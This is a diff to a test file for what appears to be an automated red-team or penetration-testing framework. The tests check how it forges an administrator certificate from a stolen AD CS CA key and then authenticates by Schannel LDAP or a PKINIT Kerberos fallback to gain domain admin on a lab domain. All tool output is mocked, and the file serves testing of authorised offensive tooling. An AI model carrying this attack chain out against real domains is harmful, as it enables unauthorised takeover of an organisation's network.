@@ -6275,6 +6275,7 @@ def test_build_capability_commands_supports_adcs_certificate_auth_pkinit():
             "callback_id": "13",
         },
         {
+            "certificate_auth_method": "pkinit",
             "ca_pfx_path": r"C:\Windows\Temp\ca.pfx",
             "proof_host": "dc01.lab.local",
         },
@@ -6362,6 +6363,7 @@ def test_materialize_capability_inputs_stages_adcs_certificate_then_builder_uses
         "timeout": 30,
     }
 
+    materialized["inputs"]["certificate_auth_method"] = "pkinit"
     plan = json.loads(asyncio.run(mt.build_capability_commands(materialized["action"], materialized["inputs"])))
 
     assert plan["ok"] is True
@@ -6806,16 +6808,20 @@ def test_execute_capability_adcs_certificate_auth_materializes_and_records(monke
         }, sort_keys=True)
 
     monkeypatch.setattr(mt, "materialize_capability_inputs", fake_materialize)
-    ticket = base64.b64encode(b"A" * 80).decode()
     outputs = iter([
         "No tickets in current context.",
         "Access is denied.",
         "Certify\nSaved forged certificate to 'C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx'.\n",
-        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
-        "Successfully impersonated local\\user for local access and lab.local\\administrator for remote access.",
-        "Added Ticket to Ticket Store",
-        "krbtgt/lab.local for administrator@lab.local",
-        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13\r\n Directory of \\\\dc01.lab.local\\C$\r\nWindows\r\n",
+        "\n".join([
+            "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
+            "CERT_AUTH_METHOD=schannel-ldap",
+            "CERT_AUTH_DOMAIN=lab.local",
+            "CERT_AUTH_ACCOUNT=administrator",
+            "CERT_AUTH_LDAP_BIND=True",
+            r"CERT_AUTH_WHOAMI=u:LAB\administrator",
+            "DA_ONLY_READ_PROVEN=True",
+            "CERT_AUTH_STATUS=OK",
+        ]),
     ])
     calls = {"issue": 0}
 
@@ -6834,27 +6840,115 @@ def test_execute_capability_adcs_certificate_auth_materializes_and_records(monke
     assert result["ok"] is True
     assert result["verdict"] == "achieved"
     assert materialize_calls["count"] == 1
-    assert calls["issue"] == 8
+    assert calls["issue"] == 4
     assert [item["command"] for item in result["issued"]] == [
         "shell",
         "shell",
         "execute_assembly",
-        "execute_assembly",
-        "make_token",
-        "ticket_store_add",
-        "ticket_store_list",
-        "shell",
+        "powerpick",
     ]
     forge_args = result["issued"][2]["parameters"]["assembly_arguments"]
     assert "forge --ca-cert C:\\Windows\\Temp\\sage_ca_signing_administrator_lab_local_13.pfx" in forge_args
-    pkinit_args = result["issued"][3]["parameters"]["assembly_arguments"]
-    assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx" in pkinit_args
-    assert "/ptt" not in pkinit_args
-    assert ticket not in json.dumps(result["issued"])
-    assert "<kerberos_ticket_base64>" in json.dumps(result["issued"])
+    assert all(
+        "asktgt " not in str(item.get("parameters", {}))
+        for item in result["issued"]
+    )
     assert "_output" not in json.dumps(result["issued"])
     assert "da:lab.local" in result["achieved_effects"]
     assert "certificate-auth:administrator@lab.local" in result["achieved_effects"]
+
+
+def test_execute_capability_adcs_certificate_auth_falls_back_to_pkinit_after_schannel_failure(monkeypatch):
+    mt = _make_tools()
+    mt._engagement_hops = [_proof_hop("adcs-ca-private-key:ca01@lab.local", 9000, callback_id="13")]
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+
+    async def fake_materialize(action, inputs=None):
+        return json.dumps({
+            "ok": True,
+            "capability": "adcs-certificate-auth",
+            "action": {
+                "name": "adcs-certificate-auth",
+                "target": "domain=lab.local;account=administrator;callback=13",
+                "preconditions": ["adcs-ca-private-key:ca01@lab.local", "live-callback:13"],
+                "effects": ["da:lab.local", "certificate-auth:administrator@lab.local"],
+                "intent": {
+                    "capability": "adcs-certificate-auth",
+                    "domain": "lab.local",
+                    "account": "administrator",
+                    "callback_id": "13",
+                    "ca_host": "ca01",
+                },
+                "verifier": {},
+                "reason": "",
+                "source_facts": [],
+            },
+            "inputs": {
+                "domain": "lab.local",
+                "target_domain": "lab.local",
+                "account": "administrator",
+                "callback_id": "13",
+                "ca_pfx_path": r"C:\Windows\Temp\sage_ca_signing_administrator_lab_local_13.pfx",
+                "ca_pfx_password": "SagePfx!administrator_lab_local_13",
+                "forged_pfx_path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
+                "forged_pfx_password": "SageCert!administrator_lab_local_13",
+                "proof_host": "dc01.lab.local",
+                "proof_resource": r"\\dc01.lab.local\C$",
+                "proof_marker": "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
+            },
+        }, sort_keys=True)
+
+    monkeypatch.setattr(mt, "materialize_capability_inputs", fake_materialize)
+    ticket = base64.b64encode(b"D" * 80).decode()
+    outputs = iter([
+        "No tickets in current context.",
+        "Access is denied.",
+        "Certify\nSaved forged certificate to 'C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx'.\n",
+        "\n".join([
+            "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
+            "CERT_AUTH_METHOD=schannel-ldap",
+            "CERT_AUTH_LDAP_BIND=False",
+            "CERT_AUTH_STATUS=FAILED",
+        ]),
+        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
+        "Successfully impersonated local\\user for local access and lab.local\\administrator for remote access.",
+        "Added Ticket to Ticket Store",
+        "krbtgt/lab.local for administrator@lab.local",
+        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13\r\n Directory of \\\\dc01.lab.local\\C$\r\nWindows\r\n",
+    ])
+    calls = {"issue": 0}
+
+    with _split_issue(lambda: next(outputs), calls, display_id=9193):
+        result = json.loads(asyncio.run(mt.execute_capability(
+            {
+                "capability": "adcs-certificate-auth",
+                "domain": "lab.local",
+                "account": "administrator",
+                "ca_host": "ca01",
+                "callback_id": "13",
+            },
+            {"proof_host": "dc01.lab.local", "timeout": 5},
+        )))
+
+    assert result["ok"] is True, result
+    assert result["fallback"] == "pkinit-kerberos"
+    assert result["verdict"] == "achieved"
+    assert calls["issue"] == 9
+    commands = [item["command"] for item in result["issued"]]
+    assert commands.index("powerpick") < next(
+        index
+        for index, item in enumerate(result["issued"])
+        if item["command"] == "execute_assembly"
+        and "asktgt " in item["parameters"]["assembly_arguments"]
+    )
+    assert sum(
+        1
+        for item in result["issued"]
+        if item["command"] == "execute_assembly"
+        and "forge --ca-cert" in item["parameters"]["assembly_arguments"]
+    ) == 1
+    assert "da:lab.local" in result["achieved_effects"]
 
 
 @pytest.mark.parametrize(
@@ -6957,7 +7051,11 @@ def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_for_com
                 "ca_host": "ca01",
                 "callback_id": "13",
             },
-            {"proof_host": "dc01.lab.local", "timeout": 5},
+            {
+                "proof_host": "dc01.lab.local",
+                "timeout": 5,
+                "certificate_auth_method": "pkinit",
+            },
         )))
 
     # A Schannel bind that only authenticates and reads the account's own group membership is
@@ -6993,6 +7091,61 @@ def test_adcs_certificate_auth_has_no_off_agent_schannel_fallback_surface():
     assert not hasattr(mt, "_capability_executor_try_host_schannel_fallback")
     assert not hasattr(mt, "_capability_executor_host_schannel_probe_sync")
     assert not hasattr(mt, "_capability_executor_try_remote_schannel_fallback")
+
+
+def test_adcs_certificate_auth_explicit_schannel_needs_declared_pkinit_fallback(monkeypatch):
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="adcs-certificate-auth",
+        target="domain=lab.local;account=administrator;callback=13",
+        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
+        intent={"domain": "lab.local", "account": "administrator", "callback_id": "13"},
+    )
+    calls = {"count": 0}
+
+    async def fake_execute(retry_action, retry_inputs):
+        calls["count"] += 1
+        assert retry_action is action
+        assert retry_inputs["certificate_auth_method"] == "pkinit-kerberos"
+        return json.dumps({"ok": True, "verdict": "achieved", "issued": [], "recorded_effects": []})
+
+    monkeypatch.setattr(mt, "execute_capability", fake_execute)
+    common = {
+        "action": action,
+        "callback_id": 13,
+        "capabilities_mod": capabilities,
+        "before_effects": set(),
+        "all_issued": [],
+        "materialized_payload": None,
+        "prior_transaction": {"status": "effect_unverified"},
+        "output": "CERT_AUTH_LDAP_BIND=False\nCERT_AUTH_STATUS=FAILED",
+    }
+
+    disabled = asyncio.run(mt._capability_executor_try_pkinit_fallback(
+        inputs={"certificate_auth_method": "schannel-ldap"},
+        **common,
+    ))
+    enabled = asyncio.run(mt._capability_executor_try_pkinit_fallback(
+        inputs={"certificate_auth_method": "schannel-ldap", "allow_pkinit_fallback": True},
+        **common,
+    ))
+
+    assert disabled is None
+    assert json.loads(enabled)["fallback"] == "pkinit-kerberos"
+    assert calls["count"] == 1
+
+
+def test_adcs_certificate_auth_wrong_identity_is_not_pkinit_fallback_eligible():
+    mt = _make_tools()
+
+    assert mt._capability_executor_schannel_pkinit_fallback_eligible(
+        "\n".join([
+            "CERT_AUTH_LDAP_BIND=True",
+            r"CERT_AUTH_WHOAMI=u:LAB\other",
+            "CERT_AUTH_STATUS=OK",
+        ]),
+        {"status": "effect_unverified"},
+    ) is False
 
 
 def test_import_capability_credential_material_imports_adcs_certificate_auth_ntlm(monkeypatch):
@@ -7096,7 +7249,7 @@ def test_execute_capability_adcs_certificate_auth_defaults_proof_to_ca_host(monk
                 "ca_host": "ca01",
                 "callback_id": "13",
             },
-            {"timeout": 5},
+            {"timeout": 5, "certificate_auth_method": "pkinit"},
         )))
 
     assert result["ok"] is True, result
@@ -7141,7 +7294,11 @@ def test_execute_capability_adcs_certificate_auth_does_not_reuse_generic_existin
                 "ca_host": "ca01",
                 "callback_id": "13",
             },
-            {"proof_host": "dc01.lab.local", "timeout": 5},
+            {
+                "proof_host": "dc01.lab.local",
+                "timeout": 5,
+                "certificate_auth_method": "pkinit",
+            },
         )))
 
     assert result["ok"] is False
@@ -7216,7 +7373,11 @@ def test_execute_capability_adcs_certificate_auth_records_failed_proof_without_a
                 "account": "administrator",
                 "callback_id": "13",
             },
-            {"proof_host": "dc01.lab.local", "timeout": 5},
+            {
+                "proof_host": "dc01.lab.local",
+                "timeout": 5,
+                "certificate_auth_method": "pkinit",
+            },
     )))
 
     assert result["ok"] is False
